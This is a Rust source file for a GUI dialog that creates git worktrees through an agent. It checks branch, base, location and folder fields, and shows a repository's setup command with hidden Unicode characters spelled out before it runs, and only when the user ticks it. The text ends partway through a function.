//! New-worktree dialog, opened from a group linked to a git repository: a new branch from a
//! base, or an existing local branch no worktree has checked out; the folder it creates (where
//! the group's location template puts it); the command its terminal starts with. The agent
//! answers what it needs to know (`AgentCmd::PlanWorktree`: branches, the folder, whether git
//! ignores it), then creates it (`AgentCmd::CreateWorktree`) after checking everything again.
//!
//! A creation sent is kept by the slice (`Sent`), not by the dialog: closing the dialog does not
//! stop it, and whenever the agent says it went through (even long after, `GitStillRunning`
//! first), the card opens in the new folder, in the group (`on_created`).
//!
//! The form is checked here as a pure function (`check`) so nothing obviously wrong is sent; the
//! agent's refusals come back as `Problem`s and are shown next to the field they are about.
//!
//! The repository's recipe (`protocol::Recipe`, in the plan) is shown before creating: each
//! pattern with what it matches now, and the full `setup` command. The agent applies the copies
//! and links itself; `setup` runs in the new card, before its template command, only when ticked,
//! and the tick starts off until the user accepted that exact command for that repository once
//! (`Trust`).

use std::sync::atomic::{AtomicU64, Ordering};
use std::time::{Duration, Instant};

use egui::{Color32, ComboBox, Id, Key, Modal, Modifiers, Popup, RichText, TextEdit, Ui};
use protocol::{
    AgentCmd, AgentEvent, CreateWorktree, DEFAULT_WORKTREE_LOCATION, Problem, RECIPE_FILE, Recipe, RecipePattern, WorktreeBranch, WorktreePlan, folder_for_branch, parse_location, valid_folder,
};

use super::cleanup::PENDING_TIMEOUT;
use super::trust::Trust;
use crate::shell::event::{Event, RecipeSummary, TaskCard, TaskWorktreeOrder, TaskWorktreePlan, TaskWorktreeSpec};
use crate::shell::i18n::t;
use crate::shell::theme;
use crate::shell::world::{ProjectId, World};

const ERROR: Color32 = Color32::from_rgb(230, 120, 90);
const WARNING: Color32 = Color32::from_rgb(230, 180, 80);
/// A plan not answered by then is asked again (an agent restarted meanwhile forgot it).
pub const PLAN_RETRY: Duration = Duration::from_secs(10);
/// A changed folder or location is asked about once it stayed the same this long (not on every
/// keystroke).
pub const PLAN_DEBOUNCE: Duration = Duration::from_millis(200);
/// Plans asked again this many times without any answer: the agent is said to be silent.
pub const SILENT_AFTER: u32 = 2;

/// Ids of the plan and creation requests (the task starts too): answers carry them back.
static NEXT_ID: AtomicU64 = AtomicU64::new(1);

pub(super) fn next_id() -> u64 {
    NEXT_ID.fetch_add(1, Ordering::Relaxed)
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Mode {
    /// A new branch from a base.
    New,
    /// A local branch no worktree has checked out.
    Existing,
}

/// The field a problem is shown next to.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Field {
    Branch,
    Base,
    Location,
    Folder,
    /// Not about one field (the agent is gone, git failed...).
    General,
}

/// What is wrong with a field.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Issue {
    /// Not filled in yet: the button stays off, nothing is said.
    Missing,
    /// Said next to the field, translated.
    Refused(Problem),
}

/// What the user typed and chose.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Form {
    pub mode: Mode,
    /// The new branch's name.
    pub name: String,
    pub base: String,
    /// The existing branch chosen.
    pub existing: Option<String>,
    pub location: String,
    pub folder: String,
}

impl Form {
    /// The branch the worktree gets, as typed.
    pub fn branch(&self) -> &str {
        match self.mode {
            Mode::New => self.name.trim(),
            Mode::Existing => self.existing.as_deref().unwrap_or_default(),
        }
    }

    /// The location as sent: `None` for the default one.
    pub fn location_sent(&self) -> Option<String> {
        let location = self.location.trim();
        (location != DEFAULT_WORKTREE_LOCATION).then(|| location.to_string())
    }

    /// The request, when nothing is wrong with the form.
    pub fn request(&self, plan: Option<&WorktreePlan>, exclude: bool) -> Option<CreateWorktree> {
        if !check(self, plan).is_empty() {
            return None;
        }
        let branch = match self.mode {
            Mode::New => WorktreeBranch::New { name: self.branch().to_string(), base: self.base.trim().to_string() },
            Mode::Existing => WorktreeBranch::Existing { name: self.branch().to_string() },
        };
        Some(CreateWorktree { branch, folder: self.folder.clone(), location: self.location_sent(), exclude })
    }
}

pub use protocol::branch_name_valid;

/// The field an agent's problem is about.
pub fn field_of(problem: &Problem) -> Field {
    match problem {
        Problem::InvalidBranchName { .. } | Problem::BranchExists { .. } | Problem::BranchNotFound { .. } | Problem::BranchCheckedOut { .. } => Field::Branch,
        Problem::BaseNotFound { .. } => Field::Base,
        Problem::LocationRefused { .. } => Field::Location,
        Problem::DestinationExists { .. } | Problem::InvalidFolder { .. } | Problem::WorktreeRegistered { .. } => Field::Folder,
        _ => Field::General,
    }
}

/// Everything wrong with the form, field by field, from what the app knows: the agent's last
/// plan (branches, the folder) when it is about this folder and location.
pub fn check(form: &Form, plan: Option<&WorktreePlan>) -> Vec<(Field, Issue)> {
    let mut issues = Vec::new();
    let branches = plan.map(|p| p.branches.as_slice()).unwrap_or_default();
    let refused = |field, problem| (field, Issue::Refused(problem));
    let name = form.branch();
    match form.mode {
        Mode::New => {
            if name.is_empty() {
                issues.push((Field::Branch, Issue::Missing));
            } else if !branch_name_valid(name) {
                issues.push(refused(Field::Branch, Problem::InvalidBranchName { branch: name.to_string() }));
            } else if branches.iter().any(|b| b.name == name) {
                issues.push(refused(Field::Branch, Problem::BranchExists { branch: name.to_string() }));
            }
            let base = form.base.trim();
            if base.is_empty() {
                issues.push((Field::Base, Issue::Missing));
            } else if base.starts_with('-') {
                issues.push(refused(Field::Base, Problem::BaseNotFound { base: base.to_string() }));
            }
        }
        Mode::Existing => match branches.iter().find(|b| b.name == name) {
            _ if name.is_empty() => issues.push((Field::Branch, Issue::Missing)),
            Some(b) => {
                if let Some(path) = &b.checked_out {
                    issues.push(refused(Field::Branch, Problem::BranchCheckedOut { branch: name.to_string(), path: path.clone() }));
                }
            }
            None if plan.is_some() => issues.push(refused(Field::Branch, Problem::BranchNotFound { branch: name.to_string() })),
            None => {}
        },
    }
    if let Err(issue) = parse_location(&form.location) {
        issues.push(refused(Field::Location, Problem::LocationRefused { location: form.location.clone(), issue }));
    }
    if !valid_folder(&form.folder) {
        issues.push(refused(Field::Folder, Problem::InvalidFolder { folder: form.folder.clone() }));
    }
    // What the agent found for this very folder.
    match plan.filter(|p| p.folder == form.folder && p.location == form.location_sent()) {
        Some(p) => match &p.problem {
            Some(problem) if !issues.iter().any(|(f, _)| *f == field_of(problem)) => issues.push((field_of(problem), Issue::Refused(problem.clone()))),
            Some(_) => {}
            None if p.path.is_none() => issues.push((Field::Folder, Issue::Missing)),
            None => {}
        },
        // Not known yet.
        None => issues.push((Field::Folder, Issue::Missing)),
    }
    issues
}

/// The bases offered: the default branch first, the group folder's current branch, then the
/// other local branches. (value, label).
pub fn base_choices(plan: &WorktreePlan) -> Vec<(String, String)> {
    let mut choices: Vec<(String, String)> = Vec::new();
    let mut add = |value: &str, label: String| {
        if !choices.iter().any(|(v, _)| v == value) {
            choices.push((value.to_string(), label));
        }
    };
    if let Some(default) = &plan.default_branch {
        add(default, (t().worktree_base_default)(default));
    }
    if let Some(current) = &plan.current_branch {
        add(current, (t().worktree_base_current)(current));
    }
    for b in &plan.branches {
        add(&b.name, b.name.clone());
    }
    choices
}

/// Local branches no worktree has checked out: what "existing branch" offers.
pub fn free_branches(plan: &WorktreePlan) -> Vec<&str> {
    plan.branches.iter().filter(|b| b.checked_out.is_none()).map(|b| b.name.as_str()).collect()
}

/// The last plan asked.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Asked {
    pub id: u64,
    pub folder: String,
    pub location: Option<String>,
    pub at: Instant,
    pub answered: bool,
}

/// Whether to ask the agent about `wanted` (folder, location) now. The first question goes at
/// once; a changed one once it stayed the same `PLAN_DEBOUNCE` (since `since`); the same one
/// again only when unanswered for `PLAN_RETRY`.
pub fn plan_due(asked: Option<&Asked>, wanted: (&str, Option<&str>), since: Instant, now: Instant) -> bool {
    match asked {
        None => true,
        Some(a) if a.folder == wanted.0 && a.location.as_deref() == wanted.1 => !a.answered && now.duration_since(a.at) >= PLAN_RETRY,
        Some(_) => now.duration_since(since) >= PLAN_DEBOUNCE,
    }
}

/// The recipe's setup command to run in the new card: only when the recipe has one and the tick
/// is on. The tick is the user's `choice` (main checkout, command, ticked) while it is about this
/// very command; otherwise on only if `trust` already accepted it for this repository.
pub fn setup_to_run(recipe: Option<&Recipe>, choice: Option<&(String, String, bool)>, trust: &Trust) -> Option<String> {
    let recipe = recipe?;
    let setup = recipe.setup.as_deref()?;
    let ticked = match choice {
        Some((main, command, ticked)) if *main == recipe.main && command == setup => *ticked,
        _ => trust.accepted(&recipe.main, setup),
    };
    ticked.then(|| setup.to_string())
}

/// A creation sent to the agent: kept by the slice until its final answer, whatever became of
/// the dialog.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Sent {
    pub id: u64,
    pub project: ProjectId,
    /// What the new card starts with.
    pub command: Option<String>,
    /// The recipe's setup command, ticked: run first in the new card (and accepted for `repo` once
    /// the creation went through).
    pub setup: Option<String>,
    /// The main checkout the setup command comes from.
    pub repo: Option<String>,
    /// The location used, saved with the group once it went through.
    pub location: Option<String>,
    /// Created for a task: its card (with the task its command reads) opens in the new folder.
    pub task: Option<Box<SentTask>>,
}

/// A creation for a task: which one, its branch, and the card to open.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct SentTask {
    pub task: String,
    pub branch: String,
    pub card: TaskCard,
}

impl Sent {
    /// The new card runs something (a setup or a template command): it must wait for the
    /// recipe's copies and links.
    pub fn starts_something(&self) -> bool {
        self.setup.is_some() || self.command.is_some()
    }
}

/// What an answer to a creation leads to: the events to send, and whether to keep waiting (git
/// still running: the final answer follows). Created: the location is saved with the group and
/// the card opens in the new folder, unless `hold` (it opens once the recipe is applied,
/// `open_card`).
pub fn on_created(sent: &Sent, path: Option<&str>, problem: Option<&Problem>, hold: bool, world: &World) -> (Vec<Event>, bool) {
    match (path, problem) {
        (_, Some(Problem::GitStillRunning { .. })) => (Vec::new(), true),
        (Some(path), None) => {
            let mut events = Vec::new();
            if world.project(&sent.project).is_some() {
                events.push(Event::SetProjectWorktreeLocation(sent.project.clone(), sent.location.clone()));
            }
            if !hold {
                events.extend(open_card(sent, path, world));
            }
            (events, false)
        }
        _ => (Vec::new(), false),
    }
}

/// The card of a worktree created: in its group, with its start; the group gone meanwhile: a
/// notice names the folder.
pub fn open_card(sent: &Sent, path: &str, world: &World) -> Vec<Event> {
    if world.project(&sent.project).is_none() {
        return vec![Event::Inform { title: t().worktree_created_title.into(), body: (t().worktree_group_gone)(path) }];
    }
    if let Some(task) = &sent.task {
        let card = TaskCard { cwd: path.to_string(), setup: sent.setup.clone(), ..task.card.clone() };
        return vec![Event::NewTaskCard(Box::new(card))];
    }
    vec![Event::NewCard { at: None, project: Some(sent.project.clone()), command: sent.command.clone(), setup: sent.setup.clone(), cwd: Some(path.to_string()) }]
}

/// The form a task's worktree is checked as, like the dialog's.
pub fn task_form(spec: &TaskWorktreeSpec) -> Form {
    let location = spec.location.clone().unwrap_or_else(|| DEFAULT_WORKTREE_LOCATION.to_string());
    match &spec.branch {
        WorktreeBranch::New { name, base } => Form { mode: Mode::New, name: name.clone(), base: base.clone(), existing: None, location, folder: spec.folder.clone() },
        WorktreeBranch::Existing { name } => Form { mode: Mode::Existing, name: String::new(), base: String::new(), existing: Some(name.clone()), location, folder: spec.folder.clone() },
    }
}

/// What the recipe will do, as the start's confirmation shows it.
pub fn recipe_summary(recipe: &Recipe, trust: &Trust) -> RecipeSummary {
    let mut lines: Vec<(String, bool)> = recipe.problem.iter().map(|p| (t().problem(p), true)).collect();
    lines.extend(recipe_lines(recipe).into_iter().map(|(line, color)| (line, color == ERROR)));
    let setup_accepted = recipe.setup.as_deref().is_some_and(|s| trust.accepted(&recipe.main, s));
    RecipeSummary { lines, setup: recipe.setup.as_deref().map(visible_setup), setup_accepted }
}

/// The answer to a task's plan request: the plan, with what the dialog's checks find wrong with
/// that very request.
pub fn task_plan(spec: &TaskWorktreeSpec, plan: &WorktreePlan, trust: &Trust) -> TaskWorktreePlan {
    let problems = check(&task_form(spec), Some(plan))
        .into_iter()
        .filter_map(|(_, issue)| match issue {
            Issue::Refused(p) => Some(p),
            Issue::Missing => None,
        })
        .collect();
    TaskWorktreePlan {
        spec: spec.clone(),
        branches: plan.branches.clone(),
        default_branch: plan.default_branch.clone(),
        path: plan.path.clone(),
        free_folder: plan.free_folder.clone(),
        exclude: plan.exclude.clone(),
        problems,
        recipe: plan.recipe.as_ref().map(|r| recipe_summary(r, trust)),
    }
}

/// The creation a task's start asks for, checked against the last plan for it: what to send, or
/// why not.
pub fn task_creation(order: &TaskWorktreeOrder, plan: Option<&WorktreePlan>, id: u64) -> Result<(CreateWorktree, Sent), Problem> {
    let form = task_form(&order.spec);
    let plan = plan.filter(|p| p.folder == order.spec.folder && p.location == form.location_sent());
    let request = form.request(plan, order.exclude && plan.is_some_and(|p| p.exclude.is_some())).ok_or_else(|| {
        check(&form, plan).into_iter().find_map(|(_, i)| if let Issue::Refused(p) = i { Some(p) } else { None }).unwrap_or(Problem::InvalidFolder { folder: order.spec.folder.clone() })
    })?;
    let recipe = plan.and_then(|p| p.recipe.as_ref());
    let setup = recipe.and_then(|r| r.setup.clone()).filter(|_| order.run_setup);
    let repo = setup.as_ref().and(recipe).map(|r| r.main.clone());
    let sent = Sent {
        id,
        project: order.spec.project.clone(),
        command: Some(order.card.command.clone()),
        setup,
        repo,
        location: request.location.clone(),
        task: Some(Box::new(SentTask { task: order.spec.task.clone(), branch: order.spec.branch.name().to_string(), card: order.card.clone() })),
    };
    Ok((request, sent))
}

/// The creation this dialog sent, not answered for good yet.
struct Pending {
    id: u64,
    at: Instant,
    /// The agent said git is still working: the answer comes when it ends.
    running: bool,
}

/// The open dialog of one group.
pub struct CreateDialog {
    pub project: ProjectId,
    pub mode: Mode,
    pub name: String,
    /// `None`: the plan's default branch.
    pub base: Option<String>,
    pub existing: Option<String>,
    pub location: String,
    /// A free folder the user accepted for this derived name: (derived, chosen).
    pub folder_choice: Option<(String, String)>,
    /// The command template to start with (`None`: a plain shell).
    pub template: Option<usize>,
    /// Add the location to `info/exclude` (off unless the user ticks it).
    pub exclude: bool,
    /// The setup tick, as the user set it: (main checkout, command, ticked).
    pub setup_choice: Option<(String, String, bool)>,
    plan: Option<WorktreePlan>,
    asked: Option<Asked>,
    /// The (folder, location) wanted, and since when.
    wanted: Option<(String, Option<String>, Instant)>,
    /// Plans asked again without any answer in between.
    retries: u32,
    pending: Option<Pending>,
    /// The agent's refusal, with the form it was about (shown while the form is the same).
    refused: Option<(Form, Problem)>,
    /// The agent never answered the creation.
    no_answer: bool,
    /// The agent stopped before answering the creation.
    lost: bool,
}

impl CreateDialog {
    pub fn new(project: ProjectId, location: Option<String>) -> Self {
        Self {
            project,
            mode: Mode::New,
            name: String::new(),
            base: None,
            existing: None,
            location: location.unwrap_or_else(|| DEFAULT_WORKTREE_LOCATION.to_string()),
            folder_choice: None,
            template: None,
            exclude: false,
            setup_choice: None,
            plan: None,
            asked: None,
            wanted: None,
            retries: 0,
            pending: None,
            refused: None,
            no_answer: false,
            lost: false,
        }
    }

    /// The agent stopped: a creation not answered yet never will be (it may or may not have been
    /// made), and its answer is not waited for any more.
    pub fn agent_lost(&mut self) {
        if self.pending.take().is_some() {
            self.lost = true;
        }
        // What the next agent knows is asked again.
        self.asked = None;
    }

    /// The agent stopped before answering this dialog's creation.
    pub fn lost(&self) -> bool {
        self.lost
    }

    pub fn creating(&self) -> bool {
        self.pending.is_some()
    }

    /// The agent left several plan requests unanswered.
    pub fn agent_silent(&self) -> bool {
        self.retries >= SILENT_AFTER
    }

    /// The form as it stands.
    pub fn form(&self) -> Form {
        let branch = match self.mode {
            Mode::New => self.name.trim().to_string(),
            Mode::Existing => self.existing.clone().unwrap_or_default(),
        };
        let derived = folder_for_branch(&branch);
        let folder = match &self.folder_choice {
            Some((d, chosen)) if *d == derived => chosen.clone(),
            _ => derived,
        };
        let base = self.base.clone().or_else(|| self.plan.as_ref().and_then(|p| p.default_branch.clone())).unwrap_or_default();
        Form { mode: self.mode, name: self.name.clone(), base, existing: self.existing.clone(), location: self.location.trim().to_string(), folder }
    }

    /// The repository's recipe, from the last plan.
    pub fn recipe(&self) -> Option<&Recipe> {
        self.plan.as_ref()?.recipe.as_ref()
    }

    /// The plan, when it is about the form's folder and location.
    fn plan_for(&self, form: &Form) -> Option<&WorktreePlan> {
        self.plan.as_ref().filter(|p| p.folder == form.folder && p.location == form.location_sent())
    }

    /// Asks the agent about the form's folder when `plan_due` says so. `true`: a question may
    /// become due later (repaint then).
    pub fn ask_plan(&mut self, events: &mut Vec<Event>, now: Instant) -> bool {
        let form = self.form();
        if !valid_folder(&form.folder) || parse_location(&form.location).is_err() {
            return false;
        }
        let location = form.location_sent();
        if self.wanted.as_ref().is_none_or(|(f, l, _)| *f != form.folder || *l != location) {
            self.wanted = Some((form.folder.clone(), location.clone(), now));
        }
        let since = self.wanted.as_ref().map_or(now, |w| w.2);
        if !plan_due(self.asked.as_ref(), (&form.folder, location.as_deref()), since, now) {
            return self.asked.as_ref().is_none_or(|a| !a.answered || a.folder != form.folder || a.location != location);
        }
        if self.asked.as_ref().is_some_and(|a| !a.answered && a.folder == form.folder && a.location == location) {
            self.retries += 1;
        }
        let id = next_id();
        events.push(Event::ToAgent(AgentCmd::PlanWorktree { id, key: self.project.clone(), folder: form.folder.clone(), location: location.clone() }));
        self.asked = Some(Asked { id, folder: form.folder, location, at: now, answered: false });
        true
    }

    /// The agent's answers about this dialog's questions. `true`: the creation went through,
    /// the dialog is done (the slice opens the card).
    pub fn handle(&mut self, ev: &AgentEvent) -> bool {
        match ev {
            AgentEvent::WorktreePlan(plan) if plan.key == self.project => {
                // Any answer shows the agent is there.
                self.retries = 0;
                if let Some(asked) = self.asked.as_mut().filter(|a| a.id == plan.id) {
                    asked.answered = true;
                    self.plan = Some((**plan).clone());
                }
                false
            }
            AgentEvent::WorktreeCreated { id, key, path, problem, .. } if *key == self.project && self.pending.as_ref().is_some_and(|p| p.id == *id) => match (path, problem) {
                (_, Some(Problem::GitStillRunning { .. })) => {
                    if let Some(p) = self.pending.as_mut() {
                        p.running = true;
                    }
                    false
                }
                (Some(_), None) => {
                    self.pending = None;
                    true
                }
                (_, problem) => {
                    self.pending = None;
                    self.refused = Some((self.form(), problem.clone().unwrap_or(Problem::NotAGitRepo)));
                    // Ask again: what the agent knows may have changed.
                    self.asked = None;
                    false
                }
            },
            _ => false,
        }
    }

    /// Stops waiting for a creation the agent never answered (the slice still opens its card if
    /// the answer comes later). Not while git is known to be working on it.
    pub fn expire(&mut self, now: Instant) {
        if self.pending.as_ref().is_some_and(|p| !p.running && now.duration_since(p.at) >= PENDING_TIMEOUT) {
            self.pending = None;
            self.no_answer = true;
        }
    }

    /// Sends the creation, if the form is right: what the slice keeps until its answer (which
    /// remembers a ticked setup command as accepted once the creation went through).
    pub fn submit(&mut self, world: &World, trust: &Trust, events: &mut Vec<Event>, now: Instant) -> Option<Sent> {
        let form = self.form();
        let plan = self.plan_for(&form);
        let exclude = self.exclude && plan.is_some_and(|p| p.exclude.is_some());
        let request = form.request(plan, exclude)?;
        if self.pending.is_some() {
            return None;
        }
        let command = self.template.and_then(|i| world.project(&self.project)?.templates.get(i)).map(|tpl| tpl.command.clone());
        let setup = setup_to_run(self.recipe(), self.setup_choice.as_ref(), trust);
        let repo = setup.as_ref().and(self.recipe()).map(|r| r.main.clone());
        let id = next_id();
        let location = request.location.clone();
        events.push(Event::ToAgent(AgentCmd::CreateWorktree { id, key: self.project.clone(), request }));
        self.pending = Some(Pending { id, at: now, running: false });
        self.refused = None;
        self.no_answer = false;
        self.lost = false;
        Some(Sent { id, project: self.project.clone(), command, setup, repo, location, task: None })
    }

    /// The problems to show next to `field`: the form's own, then the agent's refusal of this very
    /// form.
    fn problems(&self, form: &Form, issues: &[(Field, Issue)], field: Field) -> Vec<Problem> {
        let mut out: Vec<Problem> = issues
            .iter()
            .filter(|(f, _)| *f == field)
            .filter_map(|(_, i)| match i {
                Issue::Refused(p) => Some(p.clone()),
                Issue::Missing => None,
            })
            .collect();
        if let Some((refused_form, problem)) = &self.refused
            && refused_form == form
            && field_of(problem) == field
            && !out.contains(problem)
        {
            out.push(problem.clone());
        }
        out
    }

    /// Draws the dialog; creations sent go to `sent`. `false`: closed (a creation sent goes on).
    pub fn ui(&mut self, ctx: &egui::Context, world: &World, trust: &Trust, events: &mut Vec<Event>, sent: &mut Vec<Sent>) -> bool {
        let now = Instant::now();
        // Escape closes an open drop-down list first, the dialog only after.
        let list_open = Popup::is_any_open(ctx);
        self.expire(now);
        let waiting = self.ask_plan(events, now);
        if waiting || self.pending.is_some() {
            ctx.request_repaint_after(Duration::from_millis(100));
        }
        let Some(project) = world.project(&self.project) else { return false };
        let group = project.name.clone();
        let templates: Vec<String> = project.templates.iter().map(|t| t.name.clone()).collect();
        let mut open = true;
        let mut submit = false;
        Modal::new(Id::unique("new-worktree")).show(ctx, |ui| {
            ui.set_width(560.0);
            ui.label(RichText::new((t().new_worktree_title)(&group)).strong().size(16.0));
            ui.add_space(6.0);
            let busy = self.pending.is_some();
            ui.add_enabled_ui(!busy, |ui| {
                self.fields(ui, &templates);
                self.recipe_ui(ui, trust);
            });
            let form = self.form();
            let plan = self.plan_for(&form);
            let issues = check(&form, plan);
            ui.add_space(8.0);
            if self.agent_silent() {
                ui.label(RichText::new(t().worktree_no_agent).color(ERROR));
            }
            for problem in self.problems(&form, &issues, Field::General) {
                ui.label(RichText::new(t().problem(&problem)).color(ERROR));
            }
            if self.no_answer {
                ui.label(RichText::new(t().cleanup_no_answer).color(ERROR));
            }
            if self.lost {
                ui.label(RichText::new(t().worktree_agent_lost).color(ERROR));
            }
            ui.horizontal(|ui| {
                let ready = form.request(plan, false).is_some() && !busy;
                if ui.add_enabled(ready, egui::Button::new(t().worktree_create)).clicked() {
                    submit = true;
                }
                if ui.button(t().cancel).clicked() {
                    open = false;
                }
                if busy {
                    ui.spinner();
                    ui.label(RichText::new(t().worktree_creating).color(theme::TEXT_DIM));
                }
            });
            if let Some(p) = &self.pending {
                if p.running {
                    ui.label(RichText::new(t().problem(&Problem::GitStillRunning { secs: now.duration_since(p.at).as_secs() })).color(theme::TEXT_DIM));
                }
                ui.label(RichText::new(t().worktree_background).small().color(theme::TEXT_DIM));
            }
        });
        if submit {
            sent.extend(self.submit(world, trust, events, now));
        }
        if !list_open && ctx.input_mut(|i| i.consume_key(Modifiers::NONE, Key::Escape)) {
            open = false;
        }
        open
    }

    fn fields(&mut self, ui: &mut Ui, templates: &[String]) {
        ui.horizontal(|ui| {
            ui.radio_value(&mut self.mode, Mode::New, t().worktree_mode_new);
            ui.radio_value(&mut self.mode, Mode::Existing, t().worktree_mode_existing);
        });
        ui.add_space(4.0);
        let form = self.form();
        let issues = check(&form, self.plan_for(&form));
        let show = |ui: &mut Ui, problems: Vec<Problem>| {
            for problem in problems {
                ui.label(RichText::new(t().problem(&problem)).color(ERROR));
            }
        };
        egui::Grid::new("new-worktree-fields").num_columns(2).spacing([10.0, 6.0]).show(ui, |ui| {
            ui.label(t().worktree_branch_label);
            ui.vertical(|ui| {
                match self.mode {
                    Mode::New => {
                        ui.add(TextEdit::singleline(&mut self.name).hint_text(t().worktree_branch_hint).desired_width(360.0).id(Id::unique("new-worktree-branch")));
                    }
                    Mode::Existing => self.existing_ui(ui),
                }
                show(ui, self.problems(&form, &issues, Field::Branch));
            });
            ui.end_row();

            if self.mode == Mode::New {
                ui.label(t().worktree_base_label);
                ui.vertical(|ui| {
                    let choices = self.plan.as_ref().map(base_choices).unwrap_or_default();
                    let shown = choices.iter().find(|(v, _)| *v == form.base).map(|(_, l)| l.clone()).unwrap_or_else(|| form.base.clone());
                    ComboBox::from_id_salt("new-worktree-base").selected_text(shown).width(360.0).show_ui(ui, |ui| {
                        for (value, label) in &choices {
                            if ui.selectable_label(form.base == *value, label).clicked() {
                                self.base = Some(value.clone());
                            }
                        }
                    });
                    // The plan came, but names nothing to start from.
                    if self.plan.is_some() && form.base.trim().is_empty() {
                        ui.label(RichText::new(t().worktree_no_base).color(WARNING));
                    }
                    show(ui, self.problems(&form, &issues, Field::Base));
                });
                ui.end_row();
            }

            ui.label(t().worktree_location_label);
            ui.vertical(|ui| {
                ui.horizontal(|ui| {
                    ui.add(TextEdit::singleline(&mut self.location).code_editor().desired_width(280.0).id(Id::unique("new-worktree-location")));
                    if ui.add_enabled(self.location.trim() != DEFAULT_WORKTREE_LOCATION, egui::Button::new(t().worktree_location_reset)).clicked() {
                        self.location = DEFAULT_WORKTREE_LOCATION.to_string();
                    }
                });
                ui.label(RichText::new(t().worktree_location_help).small().color(theme::TEXT_DIM));
                show(ui, self.problems(&form, &issues, Field::Location));
            });
            ui.end_row();

            ui.label(t().worktree_folder_label);
            ui.vertical(|ui| self.folder_ui(ui, &form, &issues));
            ui.end_row();

            ui.label(t().worktree_start_with);
            let shown = self.template.and_then(|i| templates.get(i)).cloned().unwrap_or_else(|| t().plain_shell.to_string());
            ComboBox::from_id_salt("new-worktree-template").selected_text(shown).width(360.0).show_ui(ui, |ui| {
                ui.selectable_value(&mut self.template, None, t().plain_shell);
                for (i, name) in templates.iter().enumerate() {
                    ui.selectable_value(&mut self.template, Some(i), name);
                }
            });
            ui.end_row();
        });
    }

    /// What the repository's recipe will do: the patterns with their matches now, the setup
    /// command in full, and its tick.
    fn recipe_ui(&mut self, ui: &mut Ui, trust: &Trust) {
        let Some(recipe) = self.recipe().cloned() else { return };
        ui.add_space(8.0);
        ui.separator();
        ui.label(RichText::new((t().recipe_title)(RECIPE_FILE)).strong());
        if let Some(problem) = &recipe.problem {
            ui.label(RichText::new(t().problem(problem)).color(ERROR));
        }
        egui::ScrollArea::vertical().id_salt("new-worktree-recipe").max_height(160.0).show(ui, |ui| {
            for (line, color) in recipe_lines(&recipe) {
                ui.label(RichText::new(line).color(color));
            }
        });
        let Some(setup) = recipe.setup.clone() else { return };
        ui.add_space(4.0);
        let shown = visible_setup(&setup);
        ui.label(format!("{} ({})", t().recipe_setup_label, (t().recipe_setup_lines)(shown.lines().count().max(1))));
        // Exactly the text that would run, every line of it, anything invisible spelled out; in
        // its own scroll area so a long one never pushes the tick and the buttons away.
        egui::Frame::new().fill(theme::CARD_BG).inner_margin(6.0).show(ui, |ui| {
            egui::ScrollArea::vertical().id_salt("new-worktree-setup").max_height(140.0).show(ui, |ui| {
                ui.add(egui::Label::new(RichText::new(&shown).monospace().color(theme::TEXT)).wrap());
            });
        });
        let mut ticked = setup_to_run(Some(&recipe), self.setup_choice.as_ref(), trust).is_some();
        if ui.checkbox(&mut ticked, t().recipe_setup_tick).changed() {
            self.setup_choice = Some((recipe.main.clone(), setup.clone(), ticked));
        }
        if ticked {
            ui.label(RichText::new(t().recipe_setup_warning).small().color(WARNING));
        } else {
            ui.label(RichText::new(t().recipe_setup_off).color(theme::TEXT_DIM));
        }
    }

    fn existing_ui(&mut self, ui: &mut Ui) {
        let free: Vec<String> = self.plan.as_ref().map(|p| free_branches(p).into_iter().map(String::from).collect()).unwrap_or_default();
        if self.plan.is_some() && free.is_empty() {
            ui.label(RichText::new(t().worktree_no_free_branch).color(theme::TEXT_DIM));
            return;
        }
        let shown = self.existing.clone().unwrap_or_else(|| t().worktree_pick_branch.to_string());
        ComboBox::from_id_salt("new-worktree-existing").selected_text(shown).width(360.0).show_ui(ui, |ui| {
            for name in free {
                let selected = self.existing.as_deref() == Some(name.as_str());
                if ui.selectable_label(selected, &name).clicked() {
                    self.existing = Some(name);
                }
            }
        });
    }

    fn folder_ui(&mut self, ui: &mut Ui, form: &Form, issues: &[(Field, Issue)]) {
        let plan = self.plan_for(form).cloned();
        match plan.as_ref().and_then(|p| p.path.as_deref()) {
            Some(path) => {
                ui.label(RichText::new(path).monospace().color(theme::TEXT));
            }
            None if plan.is_none() => {
                ui.label(RichText::new(t().worktree_waiting).color(theme::TEXT_DIM));
            }
            None => {}
        }
        for problem in self.problems(form, issues, Field::Folder) {
            ui.label(RichText::new(t().problem(&problem)).color(ERROR));
        }
        if let Some(free) = plan.as_ref().and_then(|p| p.free_folder.clone())
            && ui.button((t().worktree_use_free)(&free)).clicked()
        {
            let derived = folder_for_branch(form.branch());
            self.folder_choice = Some((derived, free));
        }
        // Exactly the line the agent would write.
        if let Some(pattern) = plan.as_ref().and_then(|p| p.exclude.clone()) {
            ui.label(RichText::new(format!("⚠ {}", t().worktree_not_ignored)).color(WARNING));
            ui.checkbox(&mut self.exclude, (t().worktree_exclude_option)(&pattern));
        }
    }
}

/// The setup command as the dialog shows it: line breaks as the card's shell gets them (`\r\n`
/// and a lone `\r` become `\n`), then every character that would not show for what it is
/// (control characters, escape sequences, tabs, bidirectional and zero-width marks) spelled out
/// as `⟨U+XXXX⟩`; a `⟨` of the text itself too, so nothing shown can pass for something else.
pub fn visible_setup(text: &str) -> String {
    let text = text.replace("\r\n", "\n").replace('\r', "\n");
    let hidden = |c: char| {
        (c.is_control() && c != '\n')
            || matches!(c, '\u{00ad}' | '\u{061c}' | '\u{180e}' | '\u{200b}'..='\u{200f}' | '\u{2028}'..='\u{202e}' | '\u{2060}'..='\u{206f}' | '\u{feff}' | '\u{fff9}'..='\u{fffb}' | '\u{27e8}')
    };
    let mut out = String::with_capacity(text.len());
    for c in text.chars() {
        if hidden(c) {
            out.push_str(&format!("\u{27e8}U+{:04X}\u{27e9}", c as u32));
        } else {
            out.push(c);
        }
    }
    out
}

/// One line per recipe pattern, as the dialog shows them: copies, then links (with their
/// matches now, or why they are refused).
pub fn recipe_lines(recipe: &Recipe) -> Vec<(String, Color32)> {
    let line = |p: &RecipePattern, text: fn(&str, usize) -> String| match p.refused {
        Some(issue) => ((t().recipe_pattern_refused)(&p.pattern, t().pattern_issue(issue)), ERROR),
        None => {
